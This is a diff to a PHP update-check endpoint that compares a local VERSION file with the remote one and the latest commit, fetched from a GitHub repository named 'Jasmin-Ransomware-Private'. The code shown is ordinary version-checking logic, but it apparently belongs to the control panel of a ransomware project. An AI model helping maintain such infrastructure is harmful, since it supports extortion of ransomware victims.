@@ -6,7 +6,7 @@ require_once __DIR__ . '/includes/auth.php';
 require_auth();
 header('Content-Type: application/json');
 
-define('CURRENT_VERSION', '1.0.0');
+define('CURRENT_VERSION', trim(file_get_contents(__DIR__ . '/../VERSION') ?: '0.0.0'));
 define('REPO', '2016xyz/Jasmin-Ransomware-Private');
 define('GIT_TOKEN', trim(getenv('GIT_TOKEN') ?: ($_ENV['GIT_TOKEN'] ?? '')));
 
@@ -23,18 +23,27 @@ function gh_get($url) {
 }
 
 function check_update() {
-    $url = 'https://api.github.com/repos/' . REPO . '/commits?per_page=1';
-    $json = gh_get($url);
-    if (!$json) {
+    // 从GitHub获取远程VERSION文件
+    $url = 'https://raw.githubusercontent.com/' . REPO . '/master/VERSION';
+    $remote_ver = trim(gh_get($url) ?: '');
+    // 获取最新commit信息
+    $curl = 'https://api.github.com/repos/' . REPO . '/commits?per_page=1';
+    $json = gh_get($curl);
+    $sha=''; $date=''; $msg='';
+    if ($json) {
+        $data = json_decode($json, true);
+        $sha = substr($data[0]['sha'] ?? '', 0, 7);
+        $date = $data[0]['commit']['committer']['date'] ?? '';
+        $msg = $data[0]['commit']['message'] ?? '';
+    }
+    if (!$remote_ver && !$json) {
         echo json_encode(['ok'=>true,'update'=>false,'current'=>CURRENT_VERSION,'msg'=>'无法连接更新服务器']);
         return;
     }
-    $data = json_decode($json, true);
-    $sha = substr($data[0]['sha'] ?? '', 0, 7);
-    $date = $data[0]['commit']['committer']['date'] ?? '';
-    $msg = $data[0]['commit']['message'] ?? '';
-    echo json_encode(['ok'=>true,'update'=>true,'current'=>CURRENT_VERSION,
-        'latest_commit'=>$sha,'date'=>$date,'message'=>$msg]);
+    $has_update = ($remote_ver && $remote_ver !== CURRENT_VERSION) || ($sha && $json);
+    if ($remote_ver && $remote_ver === CURRENT_VERSION) $has_update = false;
+    echo json_encode(['ok'=>true,'update'=>$has_update,'current'=>CURRENT_VERSION,
+        'latest'=>$remote_ver ?: CURRENT_VERSION,'latest_commit'=>$sha,'date'=>$date,'message'=>$msg]);
 }
 
 function do_update() {
